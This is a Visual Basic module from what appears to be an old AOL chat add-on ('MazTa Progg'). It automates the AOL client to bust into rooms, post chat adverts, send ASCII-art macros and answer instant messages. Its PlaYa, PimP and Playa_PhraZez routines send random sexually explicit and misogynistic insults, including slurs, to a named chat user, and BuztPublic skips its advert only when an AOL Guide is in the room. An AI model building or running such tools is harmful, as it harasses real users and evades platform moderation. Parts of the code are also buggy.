Public Function MacroFilter_PCurve(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, "\", "}")
    MyString$ = RePlacestRing(MyString$, "/", "{")
    MacroFilter_PCurve$ = MyString$
End Function

Public Function MacroFilter_Ghost(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, "¯", "¨¨")
    MyString$ = RePlacestRing(MyString$, "/", ".·")
    MyString$ = RePlacestRing(MyString$, "\", "·.")
    MyString$ = RePlacestRing(MyString$, "|", ":")
    MyString$ = RePlacestRing(MyString$, "_", "..")
    MyString$ = RePlacestRing(MyString$, "¦", ":")
    MacroFilter_Ghost = MyString$
End Function
Public Function MacroFilter_Darken(MyString As String) As String
    MyString$ = RePlacestRing(MyString$, "¦", "|")
    MyString$ = RePlacestRing(MyString$, ",´", "/ ")
    MyString$ = RePlacestRing(MyString$, "`,", " \")
    MyString$ = RePlacestRing(MyString$, ":", ";")
    MacroFilter_Darken$ = MyString$
End Function

Sub BuztPR_Stop(tmr4 As Timer, tmr7 As Timer, lbl6 As Label, lbl7 As Label, cmd14, cmd13)
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okwinmsgmsg$ = gettext(e2)
If okwinmsgmsg$ = "Room name is not allowed" Then
tmr4.Enabled = False
tmr7.Enabled = False
lbl6.caption = "1"
lbl7.caption = "1"
cmd14.Enabled = False
cmd13.Enabled = True
MsgBox "AOL Duznt Alow dat Room Name ma man", vbCritical, "ERROR!"
Do
DoEvents
Loop
End If
End Sub


Sub BuztPublic(tmr3 As Timer, cmd11, cmd12, room$)
If FindRoom = False Then
cmd11.Enabled = False
cmd12.Enabled = True
tmr3.Enabled = True
Else
cmd11.Enabled = False
cmd12.Enabled = True
If Guide_Check = 1 Then MsgBox "There iz a GUIDE in thiz ro0m, Advertizing will not be done for your safety!", vbCritical, "GUIDE found?": GoTo noadv
sendchat ("</u></b></i>«··¤ <b>d</b>iSecT <b>b</b>uzter entering -<i>" + room$ + "</i>-")
noadv:
TimeOut (1.5)
top:
TimeOut (0.001)
AOL40CloseChat
If FindRoom Then GoTo top
TimeOut (3)
tmr3.Enabled = True
End If
End Sub
Sub BuztPublic_25(tmr3 As Timer, cmd11, cmd12, tmr2 As Timer, room$)
If AOL25_FindroOm = 0 Then
cmd11.Enabled = False
cmd12.Enabled = True
tmr2.Enabled = True
tmr3.Enabled = True
Else
cmd11.Enabled = False
cmd12.Enabled = True
Call sendchat(Chat_Elite("Titan BlunT BuzTa Puffin in2 [" + room$ + " •×"))
TimeOut (1)
top:
If AOL25_FindroOm = 1 Then GoTo top
TimeOut (0.5)
tmr2.Enabled = True
tmr3.Enabled = True
End If
End Sub

Sub Macro_IXI()
Site$ = "< a href=" & "www.geocities.com\ouwop" & ">" & "<u>IXI" & "</a>"
WOPemail$ = "<Font Color=#0000ff><B>IXI      <B>O</b>u(/\)oP'z <b>(\/)</b>azTa <b>P</b>rogg<B>      IXI"
'ronEMAIL$ = "< a href=" & "mailto:Ron_IXI@Hotmail.com" & ">" & "</u>IXI" & "</a>"


sendchat (WOPemail$)
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI                                                <Font Color=#0000ff>IXI"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>      |\¯¯¯\_''                  |\¯¯¯\_'   <B><Font Color=#0000ff>IXI"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>      |:|     '|' |¯¯¯| |¯¯¯|    |:|     '|'    <B><Font Color=#0000ff>IXI</b>"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>      '\/     /| |\     \/    /|    '\/     /|    <B><Font Color=#0000ff>IXI"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>      /     '/:| '/'    /\    '\     /     '/:|    <B><Font Color=#0000ff>IXI</b>"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>     /___/::|°|___| |___|   /___/::|°   <B><Font Color=#0000ff>IXI"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>    |'¯`;´'|::/  |'¯`;'|\|'¯`;' |  |'¯`;´'|::/     <B><Font Color=#0000ff>IXI</b>"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>    |::·.· |/  _|::·.·| |::·.·'|  |::·.· |/ _    <B><Font Color=#0000ff>IXI"
TimeOut (0.4)
sendchat "<Font Color=#0000ff><B>IXI</b><Font Color=#gggggg>     ¯¯¯       ¯¯¯  ¯¯¯    ¯¯¯         <B><Font Color=#0000ff>IXI</b>"
TimeOut (0.6)
BoldSendChat "< a href=" & "www.geocities.com\ouwop" & ">" & "<u>IXI  Click Here to git MazTa Progg  IXI" & "</a>"
TimeOut (0.5)
End Sub

Function RemoveSpace(TheText$)
'rezurection-
Dim Text$
Dim theloop%
Text$ = TheText$
For theloop% = 1 To Len(TheText$)
If Mid(Text$, theloop%, 1) = " " Then
Text$ = Left$(Text$, theloop% - 1) + Right$(Text$, Len(Text$) - theloop%)
theloop% = theloop% - 1
End If
Next
RemoveSpace = Text$
End Function
Function baiT_(TheText$)
Dim Text$
Dim theloop%
Text$ = TheText$
For theloop% = 1 To Len(TheText$)
If Mid(Text$, theloop%, 1) = Chr(9) Then
Text$ = Left$(Text$, theloop% - 1) '+ Right$(Text$, Len(Text$) - theloop%)
theloop% = theloop% - 1
End If
Next
baiT_ = Text$
End Function

Function AOL25_FindroOm()
'Ouwop
     AOL& = FindWindow("AOL Frame25", vbNullString)
     MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
     child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
     edit& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString)
     list& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
     icon& = FindWindowEx(child&, 0&, "_AOL_Icon", vbNullString)
    If edit& <> 0& And list& <> 0& And icon& <> 0& Then
         AOL25_FindroOm = child&
    Else
        Do: DoEvents
             child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
             edit& = FindWindowEx(child&, 0&, "_AOL_Edit", vbNullString)
             list& = FindWindowEx(child&, 0&, "_AOL_Listbox", vbNullString)
             icon& = FindWindowEx(child&, 0&, "_AOL_Child", vbNullString)
            If edit& <> 0& And list& <> 0& And icon& <> 0& Then
                 AOL25_FindroOm = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
End Function
Function AOL25_CloseChat()
'Ouwop
d$ = AOL25_FindroOm
If d$ = False Then
Else
Call AOL4_KillWin(d$)
End If
End Function

Function AOL25_GetCurrentRoOmName()
d$ = AOL25_FindroOm
If d$ = "" Then
AOL25_GetCurrentRoOmName = ""
Else
AOL25_GetCurrentRoOmName = gettext(d$)

End If
End Function

Sub AOL25_SendchaT(txtz)
'ouwop niqqa
'sendz to aol4 if findz aol4 room
'juzt uze Call Sendchat(daTXT)
'and itll send wherever it findz
'see Procedure SENDCHAT
If AOL25_FindroOm <> 0 Then
Call ClicK_OK("America Online")
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chil% = FindChildByClass(MDI%, "AOL Child")
Where% = FindChildByClass(chil%, "_AOL_Edit")
X = SendMessageByString(Where%, WM_SETTEXT, 0, txtz)
Call SendMessageByNum(Where%, WM_CHAR, 13, 0)
Call ClicK_OK("America Online")
Else
Call ClicK_OK("America Online")
End If
End Sub

Function Wait4window(caption As String) As Integer
Do
DoEvents
win% = FindChildByTitle(AolMdi, caption$)
Loop Until win% <> 0
WaitForWin = win%
FreeProcess
End Function
Sub KillNotifyAOLIcon_IM()
' Kills the Notify icon on a im
If findiM = 0 Then Exit Sub
ParHand1& = FindWindow("AOL Frame25", "America  Online")
ParHand2& = FindWindowEx(ParHand1&, 0, "MDIClient", vbNullString)
OurParent& = FindWindowEx(ParHand2&, 0, "AOL Child", vbNullString)
Hand1& = FindWindowEx(OurParent&, 0, "_AOL_Icon", vbNullString)
Hand2& = FindWindowEx(OurParent&, Hand1&, "_AOL_Icon", vbNullString)
Hand3& = FindWindowEx(OurParent&, Hand2&, "_AOL_Icon", vbNullString)
Hand4& = FindWindowEx(OurParent&, Hand3&, "_AOL_Icon", vbNullString)
Hand5& = FindWindowEx(OurParent&, Hand4&, "_AOL_Icon", vbNullString)
Hand6& = FindWindowEx(OurParent&, Hand5&, "_AOL_Icon", vbNullString)
Hand7& = FindWindowEx(OurParent&, Hand6&, "_AOL_Icon", vbNullString)
Hand8& = FindWindowEx(OurParent&, Hand7&, "_AOL_Icon", vbNullString)
Hand9& = FindWindowEx(OurParent&, Hand8&, "_AOL_Icon", vbNullString)
Hand10& = FindWindowEx(OurParent&, Hand9&, "_AOL_Icon", vbNullString)
Hand11& = FindWindowEx(OurParent&, Hand10&, "_AOL_Icon", vbNullString)
ourhandle& = FindWindowEx(OurParent&, Hand11&, "_AOL_Icon", vbNullString)
Call SendMessage(ourhandle&, WM_CLOSE, 0, 0)
End Sub
Sub KillAOLTimer()
'rezurection-
'This kills the AOL timer so no idle warnings
'or "you have been on 45 mins would you like to
'stay online" !!!!FIRST OF ITS KIND!!!!
ourhandle& = FindWindow("_AOL_TimeKeeper", "")
Call EnableWindow(ourhandle&, 0)
End Sub
Sub Check_1zt_time(meee, nextT)
'ouwop
'u basically cant uze thiz cuz most of da code for it iz in my vbp
'made for mazta progg, have fun tryin to figure it out
If MsgBox("You Want Diz Password Screen to Show Next Time you Start MazTa progg?", vbQuestion + vbYesNo, "Show PW Screen Next Time?") = vbYes Then
meee.Show
Unload nextT
Else
'On Error Resume Next
Call INI_WriTe("Settingz", "Pw", "no", "C:\windows\uzer.ini")
MsgBox "welcome to mazta prog # 3, advanced prog fer advanced net uzerz. enjoy and report any fargin bugz, peace nerga -=p", 64, "zerp -=p"

End If

End Sub

Public Sub ENTERnADDprZ(ListOfRooms As ListBox, ListOfPeople As ListBox)
'Ou(/\)oP
Dim GetPR&
For GetPR& = 0 To ListOfRooms.listcount - 1
 Call XAOL4_PRBust(ListOfRooms.list(GetPR))
 TimeOut 1#
 Call AddRoomToListbox(ListOfPeople)
 ListOfRooms.RemoveItem Index
Next GetPR&
End Sub
Public Sub LoadText(txtLoad As TextBox, Path As String)
'Does:
' Loads A TextBox From A Specific Destination
'Example:
' Call LoadText(Text1, "C:\Test.dat")
    Dim TextString As String
    On Error Resume Next
    Open Path$ For Input As #1
    TextString$ = Input(LOF(1), #1)
    Close #1
    txtLoad.Text = TextString$
End Sub
Sub Playa_PhraZez(Who$)
'ouwop
If MsgBox("Click ""Yes"" to be a Playa, or ""NO"" to be a Pimp", vbQuestion + vbYesNo, "Iz You Sure?") = vbYes Then
    Dim PlaYa
    Randomize
    PlaYa = Int(50 * Rnd + 1)
If PlaYa = 1 Then dun$ = ", i love you"
If PlaYa = 2 Then dun$ = ", i want you"
If PlaYa = 3 Then dun$ = ", i need you"
If PlaYa = 4 Then dun$ = ", wanna fuck?"
If PlaYa = 5 Then dun$ = ", lemme go down!"
If PlaYa = 6 Then dun$ = ", do me a favor"
If PlaYa = 7 Then dun$ = ", lez go all night"
If PlaYa = 8 Then dun$ = ", Cum ova my way"
If PlaYa = 9 Then dun$ = ", wanna wreztle?"
If PlaYa = 10 Then dun$ = ", Freak me baby"
If PlaYa = 11 Then dun$ = ", Im not a playa"
If PlaYa = 12 Then dun$ = ", You want me?"
If PlaYa = 13 Then dun$ = ", You need me?"
If PlaYa = 14 Then dun$ = ", You Love me?"
If PlaYa = 15 Then dun$ = ", Im fantazizing"
If PlaYa = 16 Then dun$ = ", I cant Wait"
If PlaYa = 17 Then dun$ = ", Brb- Eating Puzzy"
If PlaYa = 18 Then dun$ = ", I wanna fuck Now!"
If PlaYa = 19 Then dun$ = ", my tung will make u cry"
If PlaYa = 20 Then dun$ = ", im on my way"
If PlaYa = 21 Then dun$ = ", Can i be yourz?"
If PlaYa = 22 Then dun$ = ", Im down 4 Whateva"
If PlaYa = 23 Then dun$ = ", you know u wunt me"
If PlaYa = 24 Then dun$ = ", I mizz you"
If PlaYa = 25 Then dun$ = ", Hold me tight"
If PlaYa = 26 Then dun$ = ", iLL Neva let you go"
If PlaYa = 27 Then dun$ = ", Youll b my 1zt"
If PlaYa = 28 Then dun$ = ", lez run-away 2-getha"
If PlaYa = 29 Then dun$ = ", wed make luv constantly"
If PlaYa = 30 Then dun$ = ", ever thought bout marriage?"
If PlaYa = 31 Then dun$ = ", lez have a 3-some"
If PlaYa = 32 Then dun$ = ", my heart hurtz 4 you"
If PlaYa = 33 Then dun$ = ", juz 1 more sip"
If PlaYa = 34 Then dun$ = ", i wanna hole u in my armz"
If PlaYa = 35 Then dun$ = ", ill cry for you"
If PlaYa = 36 Then dun$ = ", kiss me all ova"
If PlaYa = 37 Then dun$ = ", lemme kizz you all ova"
If PlaYa = 38 Then dun$ = ", Get da Ice!"
If PlaYa = 39 Then dun$ = ", u down wit 4-Play?"
If PlaYa = 40 Then dun$ = ", keep it on a Downlow"
If PlaYa = 41 Then dun$ = ", lez make sweet luv"
If PlaYa = 42 Then dun$ = ", i do not mind dat 69"
If PlaYa = 43 Then dun$ = ", u cant handle diz"
If PlaYa = 44 Then dun$ = ", i got dat bomb luv making"
If PlaYa = 45 Then dun$ = ", im gitting aroused"
If PlaYa = 46 Then dun$ = ", im feenin~ 4 you"
If PlaYa = 47 Then dun$ = ", hold me tight"
If PlaYa = 48 Then dun$ = ", im da mac daddy"
If PlaYa = 49 Then dun$ = ", i wanna b loved!"
If PlaYa = 50 Then dun$ = ", iz it tru, dat itz you?"
Call ItalicSendChat(Who$ + dun$)
Else
    Dim playa2
    Randomize
    playa2 = Int(31 * Rnd + 1)

If playa2 = 1 Then dun$ = ", i dont luv dem Hoe'z"
If playa2 = 2 Then dun$ = ", You a BITCH!"
If playa2 = 3 Then dun$ = ", Pimp Slap... Kow PLOW!!!"
If playa2 = 4 Then dun$ = ", all Bitchez da Same"
If playa2 = 5 Then dun$ = ", u a Str8 up HOE!"
If playa2 = 6 Then dun$ = ", im through Witchu Bitch!"
If playa2 = 7 Then dun$ = ", Im a lowked out gangzta Set trippin baby!"
If playa2 = 8 Then dun$ = ", Suck on Deez Nuttz"
If playa2 = 9 Then dun$ = ", Gimmie Some head"
If playa2 = 10 Then dun$ = ", guezz what  .....DIZ DICK!"
If playa2 = 11 Then dun$ = ", bend ova bitch"
If playa2 = 12 Then dun$ = ", Im your daddy"
If playa2 = 13 Then dun$ = ", Im your pimp"
If playa2 = 14 Then dun$ = ", Bitch!"
If playa2 = 15 Then dun$ = ", Hoe!"
If playa2 = 16 Then dun$ = ", you ma #1 Hoe"
If playa2 = 17 Then dun$ = ", pimp dick in yo mouth"
If playa2 = 18 Then dun$ = ", where'z ma money hoe"
If playa2 = 19 Then dun$ = ", yo mom wuz ma #1 Hoe"
If playa2 = 20 Then dun$ = ", 1   2 " + getuser + " Cuming 4 you!"
If playa2 = 21 Then dun$ = ", i buzt u in da 4-head"
If playa2 = 22 Then dun$ = ", 1 burzt n out 4 da count"
If playa2 = 23 Then dun$ = ", IXI - tru pimpz 4 life"
If playa2 = 24 Then dun$ = ", u gotta stinkin azz p<html></html><html></html>u<html></html><html></html>z<html></html><html></html>z<html></html><html></html>y<html></html><html></html>"
If playa2 = 25 Then dun$ = ", yo azz smellz betta den yo puzzy"
If playa2 = 26 Then dun$ = ", who u backtalkin?"
If playa2 = 27 Then dun$ = ", " + getuser + " <~~~~~~~~#1 PIMP!"
If playa2 = 28 Then dun$ = ", Hoe 4 Crack?"
If playa2 = 29 Then dun$ = ", Juz 1 more Sip..."
If playa2 = 30 Then dun$ = ", I slap da shit outta u bitch"
If playa2 = 31 Then dun$ = ", Pimp all Bitchez~"
Call BoldSendChat(Who$ + dun$)
End If

End Sub
Sub PlaYa(Who$)
'ouwop
    Dim PlaYa
    Randomize
    PlaYa = Int(50 * Rnd + 1)
If PlaYa = 1 Then dun$ = ", i love you"
If PlaYa = 2 Then dun$ = ", i want you"
If PlaYa = 3 Then dun$ = ", i need you"
If PlaYa = 4 Then dun$ = ", wanna fuck?"
If PlaYa = 5 Then dun$ = ", lemme go down!"
If PlaYa = 6 Then dun$ = ", do me a favor"
If PlaYa = 7 Then dun$ = ", lez go all night"
If PlaYa = 8 Then dun$ = ", Cum ova my way"
If PlaYa = 9 Then dun$ = ", wanna wreztle?"
If PlaYa = 10 Then dun$ = ", Freak me baby"
If PlaYa = 11 Then dun$ = ", Im not a playa"
If PlaYa = 12 Then dun$ = ", You want me?"
If PlaYa = 13 Then dun$ = ", You need me?"
If PlaYa = 14 Then dun$ = ", You Love me?"
If PlaYa = 15 Then dun$ = ", Im fantazizing"
If PlaYa = 16 Then dun$ = ", I cant Wait"
If PlaYa = 17 Then dun$ = ", Brb- Eating Puzzy"
If PlaYa = 18 Then dun$ = ", I wanna fuck Now!"
If PlaYa = 19 Then dun$ = ", my tung will make u cry"
If PlaYa = 20 Then dun$ = ", im on my way"
If PlaYa = 21 Then dun$ = ", Can i be yourz?"
If PlaYa = 22 Then dun$ = ", Im down 4 Whateva"
If PlaYa = 23 Then dun$ = ", you know u wunt me"
If PlaYa = 24 Then dun$ = ", I mizz you"
If PlaYa = 25 Then dun$ = ", Hold me tight"
If PlaYa = 26 Then dun$ = ", iLL Neva let you go"
If PlaYa = 27 Then dun$ = ", Youll b my 1zt"
If PlaYa = 28 Then dun$ = ", lez run-away 2-getha"
If PlaYa = 29 Then dun$ = ", wed make luv constantly"
If PlaYa = 30 Then dun$ = ", ever thought bout marriage?"
If PlaYa = 31 Then dun$ = ", lez have a 3-some"
If PlaYa = 32 Then dun$ = ", my heart hurtz 4 you"
If PlaYa = 33 Then dun$ = ", juz 1 more sip"
If PlaYa = 34 Then dun$ = ", i wanna hole u in my armz"
If PlaYa = 35 Then dun$ = ", ill cry for you"
If PlaYa = 36 Then dun$ = ", kiss me all ova"
If PlaYa = 37 Then dun$ = ", lemme kizz you all ova"
If PlaYa = 38 Then dun$ = ", Get da Ice!"
If PlaYa = 39 Then dun$ = ", u down wit 4-Play?"
If PlaYa = 40 Then dun$ = ", keep it on a Downlow"
If PlaYa = 41 Then dun$ = ", lez make sweet luv"
If PlaYa = 42 Then dun$ = ", i do not mind dat 69"
If PlaYa = 43 Then dun$ = ", u cant handle diz"
If PlaYa = 44 Then dun$ = ", i got dat bomb luv making"
If PlaYa = 45 Then dun$ = ", im gitting aroused"
If PlaYa = 46 Then dun$ = ", im feenin~ 4 you"
If PlaYa = 47 Then dun$ = ", hold me tight"
If PlaYa = 48 Then dun$ = ", im da mac daddy"
If PlaYa = 49 Then dun$ = ", i wanna b loved!"
If PlaYa = 50 Then dun$ = ", iz it tru, dat itz you?"
Call ItalicSendChat(Who$ + dun$)

End Sub
Sub PimP(Who$)
'ouwop
    Dim playa2
    Randomize
    playa2 = Int(31 * Rnd + 1)

If playa2 = 1 Then dun$ = ", i dont luv dem Hoe'z"
If playa2 = 2 Then dun$ = ", You a BITCH!"
If playa2 = 3 Then dun$ = ", Pimp Slap... Kow PLOW!!!"
If playa2 = 4 Then dun$ = ", all Bitchez da Same"
If playa2 = 5 Then dun$ = ", u a Str8 up HOE!"
If playa2 = 6 Then dun$ = ", im through Witchu Bitch!"
If playa2 = 7 Then dun$ = ", Im a lowked out gangzta Set trippin baby!"
If playa2 = 8 Then dun$ = ", Suck on Deez Nuttz"
If playa2 = 9 Then dun$ = ", Gimmie Some head"
If playa2 = 10 Then dun$ = ", guezz what  .....DIZ DICK!"
If playa2 = 11 Then dun$ = ", bend ova bitch"
If playa2 = 12 Then dun$ = ", Im your daddy"
If playa2 = 13 Then dun$ = ", Im your pimp"
If playa2 = 14 Then dun$ = ", Bitch!"
If playa2 = 15 Then dun$ = ", Hoe!"
If playa2 = 16 Then dun$ = ", you ma #1 Hoe"
If playa2 = 17 Then dun$ = ", pimp dick in yo mouth"
If playa2 = 18 Then dun$ = ", where'z ma money hoe"
If playa2 = 19 Then dun$ = ", yo mom wuz ma #1 Hoe"
If playa2 = 20 Then dun$ = ", 1   2 " + getuser + " Cuming 4 you!"
If playa2 = 21 Then dun$ = ", i buzt u in da 4-head"
If playa2 = 22 Then dun$ = ", 1 burzt n out 4 da count"
If playa2 = 23 Then dun$ = ", IXI - tru pimpz 4 life"
If playa2 = 24 Then dun$ = ", u gotta stinkin azz p<html></html><html></html>u<html></html><html></html>z<html></html><html></html>z<html></html><html></html>y<html></html><html></html>"
If playa2 = 25 Then dun$ = ", yo azz smellz betta den yo puzzy"
If playa2 = 26 Then dun$ = ", who u backtalkin?"
If playa2 = 27 Then dun$ = ", " + getuser + " <~~~~~~~~#1 PIMP!"
If playa2 = 28 Then dun$ = ", Hoe 4 Crack?"
If playa2 = 29 Then dun$ = ", Juz 1 more Sip..."
If playa2 = 30 Then dun$ = ", I slap da shit outta u bitch"
If playa2 = 31 Then dun$ = ", Pimp all Bitchez~"
Call BoldSendChat(Who$ + dun$)


End Sub



Public Sub SaveText(txt As TextBox, filepath As String)
'IXI nigga [ouwop]
' Savez uh TextBox 2 whereva u wunt
'Ex: Call SaveText(Text1, "C:\Tezt.dat")
    Dim TxtString As String
    On Error Resume Next
    TxtString$ = txt.Text
    Open filepath$ For Output As #1
    Print #1, TxtString$
    Close #1
End Sub
Public Function FindAOLChildByTitle(ChildTitle As String) As Long
' Does:
'    Returns The Handle Of An AOL Child With
'    A Specific Title
' Example:
'    Buddy& = FindAOLChildByTitle("Buddy List Window")
Dim GetIt As Long
GetIt& = FindWindowEx(AolMdi, 0&, "AOL Child", ChildTitle$)
FindAOLChildByTitle = GetIt&
End Function
Public Function IMFind() As Long
    'Lookz for uh Instant Mezzage Window on AOL4
    Dim AOL As Long, MDI As Long, child As Long, caption As String
   ' aol& = FindWindow("AOL Frame25", vbNullString)
  '  mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(AolMdi, 0&, "AOL Child", vbNullString)
    caption$ = getcaption(child&)
    If InStr(caption$, "Instant Message ") <> 0& Then
        IMFind& = child&
        Exit Function
    Else
        Do
                child& = FindWindowEx(AolMdi, child&, "AOL Child", vbNullString)
         caption$ = getcaption(child&)
          If InStr(caption$, "Instant Message ") <> 0& Then
           IMFind& = child&
          Exit Function
            End If
        Loop Until child& <> 0&
    
    End If

End Function



Public Sub IManswer(Msg As String)
    Dim IM As Long, Rich As Long, icon As Long
    IM& = IMFind&
    If IM& = 0& Then Exit Sub
    Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(IM&, Rich&, "RICHCNTL", vbNullString)
    icon& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Msg$)
    DoEvents
    Call SendMessage(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(icon&, WM_LBUTTONUP, 0&, 0&)
  
End Sub
Function Get_IMtexT()
'ouwop
    Dim IM As Long, Rich As Long, icon As Long
    IM& = IMFind&
    If IM& = 0& Then Exit Function
    Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
  Get_IMtexT = gettext(Rich&)
End Function
Public Sub AOL25_IManswer(Msg As String)
   'not tezTed yetz >;c
    Dim IM As Long, Rich As Long, icon As Long
    IM& = IMFind&
    If IM& = 0& Then Exit Sub
    Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(IM&, Rich&, "RICHCNTL", vbNullString)
    icon& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, Msg$)
    DoEvents
    Call SendMessage(icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(icon&, WM_LBUTTONUP, 0&, 0&)
  
End Sub
Public Sub wait4blankIM()
Do
DoEvents
mmm:
    Dim IM As Long, Rich As Long, icon As Long
    IM& = IMFind&
    If IM& = 0& Then Exit Sub
    Rich& = FindWindowEx(IM&, 0&, "RICHCNTL", vbNullString)
    Rich& = FindWindowEx(IM&, Rich&, "RICHCNTL", vbNullString)
    icon& = FindWindowEx(IM&, 0&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
    icon& = FindWindowEx(IM&, icon&, "_AOL_Icon", vbNullString)
d$ = gettext(Rich&)
If proG_STAT$ = "OFF" Then
If d$ = "" Then GoTo nnn Else GoTo mmm
nnn:
Exit Sub
Exit Do
End If
DoEvents
Loop Until findiM = 0
    
    


End Sub

Public Sub Check_PW(tryz As Label, daPW, see, frm, frm2, timez As Label)
'ouwop
'made diz for Mazta Progg to
'it givez da uzer 3 tryz to git da PW correct
'i doubt u can figure out how to uze it but have fun!
pw$ = LCase(see)
If pw$ = daPW Then
Call Check_1zt_time(frm2, frm)
Unload frm
frm2.Show
Else
If tryz.caption = "3" Then
Call Playwav(App.Path + "\mazta_10.wav")
MsgBox "3 Tryz your out Son Son", vbCritical, "LaTaZ!"
dd$ = INI_GeT("mazta", "mpw", App.Path + "\uzer.ini")
If dd$ = "" Then dd$ = "ouwopz peepz"
If dd$ = "ouwopz peepz" Then If MsgBox("You wanna send Ouwop a Email Requezting da PW?", vbQuestion + vbYesNo, "Send Ouwop a Email?") = vbYes Then Call senDmail("Ouwopzto0lz@Hotmail.com", "Requezting PW 4 MazTa", getuser) Else MsgBox "password for mazta prog haz been changed by a uzer at your houze, only he/she can accezz mazta prog.", vbCritical, "heh"
End
Else
ent$ = Chr(10)
tryz.caption = tryz.caption + 1
fer$ = "3" - tryz.caption
Call Playwav(App.Path + "\mazta_10.wav")
MsgBox "Access Denied!" + ent$ + ent$ + "Try # [ " + tryz.caption + " ]" + ent$ + ent$ + fer$ + " Try'z Left!", vbCritical, "Denied!"
'check_ASk
End If
End If
End Sub
Function Ouwop_SysINFO(txt As TextBox)
Dim sMyInfo As String
Dim sMyInfo2 As String
Dim sMyInfo3 As String
Dim sMyInfo4 As String
Dim sMyInfo5 As String
Dim fg As String
Dim FF As String
  Dim Msg As String
    Dim Ret%, buffer$
    Dim ver_major$, ver_minor$, build$
    vTekst$ = "¤•[System Information " & vbCrLf & vbCrLf
    ' Get windowsdirectory
    buffer$ = Space(255)
    Ret% = GetWindowsDirectory(buffer, 255)
    WinDir$ = Left$(buffer$, Ret%)
    vTekst$ = vTekst$ & "¤•[Windowsdirectory: " & WinDir$ & vbCrLf
    buffer$ = Space(255)
    Ret% = GetSystemDirectory(buffer, 255)
    sysdir$ = Left$(buffer$, Ret%)
    vTekst$ = vTekst$ & "¤•[Win-Sys-Dir: " & sysdir$ & vbCrLf
    buffer$ = Environ("Temp")
    vTekst$ = vTekst$ & "¤•[Tempory-Directory: " & buffer$ & vbCrLf
    'Get operating system and version.
    Dim verinfo As OSVERSIONINFO
    verinfo.dwOSVersionInfoSize = Len(verinfo)
    Ret% = GetVersionEx(verinfo)
    If Ret% = 0 Then
        MsgBox "Error Getting Version Information"
        Exit Function
    End If
    Select Case verinfo.dwPlatformId
        Case 0
            winver$ = "Windows 32s "
        Case 1
            winver$ = "Windows 95/98 "
        Case 2
            winver$ = "Windows NT "

    End Select
    vTekst$ = vTekst$ & "¤•[Operating syztem: " & winver$ & vbCrLf
sMyInfo = getdiskinfo("c:\", "FreeBytes")
    sMyInfo2 = getdiskinfo("c:\", "Totalbytes")
    sMyInfo3 = getdiskinfo("c:\", "Freepcnt")
    sMyInfo4 = getdiskinfo("c:\", "UsedPcnt")
     sMyInfo5 = GetScreenSETTINGS
    
vTekst$ = vTekst$ & "¤•[Total Space C:\ " + sMyInfo2 + vbCrLf
vTekst$ = vTekst$ & "¤•[Free Space C:\ " + sMyInfo + vbCrLf
vTekst$ = vTekst$ & "¤•[Free % C:\ " + sMyInfo3 + vbCrLf
